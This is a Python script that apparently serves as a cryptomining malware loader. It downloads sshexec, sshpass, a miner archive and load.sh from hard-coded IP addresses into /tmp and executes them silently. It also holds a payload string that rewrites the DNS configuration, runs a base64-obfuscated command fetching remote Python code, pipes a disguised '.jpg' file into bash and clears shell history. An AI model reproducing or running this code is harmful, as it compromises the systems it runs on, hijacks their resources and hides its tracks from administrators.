import urllib
import platform
import os

payload = 'echo "nameserver 8.8.8.8" > /etc/resolv.conf; echo "cHl0aG9uIC1jICdpbXBvcnQgdXJsbGliO2V4ZWModXJsbGliLnVybG9wZW4oImh0dHA6Ly8xMDcuMTg5LjExLjE3MC9kLnB5IikucmVhZCgpKSc=" | base64 -d | bash -; apt-get install wget -y; yum install wget -y; apt-get install curl -y; yum install curl -y; wget -q -O - http://107.189.11.170/2start.jpg | bash -sh; curl -fsSL http://107.189.11.170/2start.jpg | bash -sh; lwp-download http://107.189.11.170/2start.jpg /tmp/2start.jpg; bash /tmp/2start.jpg; rm -rf /tmp/2start.jpg; history -c'
if platform.architecture()[0] == "64bit":
	urlx64 = "http://205.185.113.151/sshexec"
	urlxx = "http://205.185.113.151/sshpass"
	urlxxx = "http://205.185.113.151/miner.tar.gz"
	urlxxxx = "http://205.185.113.151/load.sh"
	try:
		f = urllib.urlopen(urlx64)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/sshexec", "wb") as code:
				code.write(data)
		xx = urllib.urlopen(urlxx)
		if f.code == 200:
			data = xx.read()
			with open ("/tmp/sshpass", "wb") as code:
				code.write(data)
		xxx = urllib.urlopen(urlxxx)
		if f.code == 200:
			data = xxx.read()
			with open ("/tmp/miner.tar.gz", "wb") as code:
				code.write(data)
		xxxx = urllib.urlopen(urlxxxx)
		if f.code == 200:
			data = xxxx.read()
			with open ("/tmp/load.sh", "wb") as code:
				code.write(data)
		os.chmod("/tmp/sshexec", 0o777)
		os.chmod("/tmp/sshpass", 0o777)
		os.chmod("/tmp/load.sh", 0o777)
		os.system("nohup /tmp/load.sh >/dev/null 2>&1")
	except:
		pass
else:
	urlx32 = "http://205.185.113.151/sshexec"
	urlyy = "http://205.185.113.151/sshpass"
	urlyyy = "http://205.185.113.151/miner.tar.gz"
	urlyyyy = "http://205.185.113.151/load.sh"
	try:
		f = urllib.urlopen(urlx32)
		if f.code == 200:
			data = f.read()
			with open ("/tmp/sshexec", "wb") as code:
				code.write(data)
		yy = urllib.urlopen(urlyy)
		if f.code == 200:
			data = yy.read()
			with open ("/tmp/sshpass", "wb") as code:
				code.write(data)
		yyy = urllib.urlopen(urlyyy)
		if f.code == 200:
			data = yyy.read()
			with open ("/tmp/miner.tar.gz", "wb") as code:
				code.write(data)
		yyyy = urllib.urlopen(urlyyyy)
		if f.code == 200:
			data = yyyy.read()
			with open ("/tmp/load.sh", "wb") as code:
				code.write(data)
		os.chmod("/tmp/sshexec", 0o777)
		os.chmod("/tmp/sshpass", 0o777)
		os.chmod("/tmp/load.sh", 0o777)
		os.system("nohup /tmp/load.sh >/dev/null 2>&1")
	except:
		pass
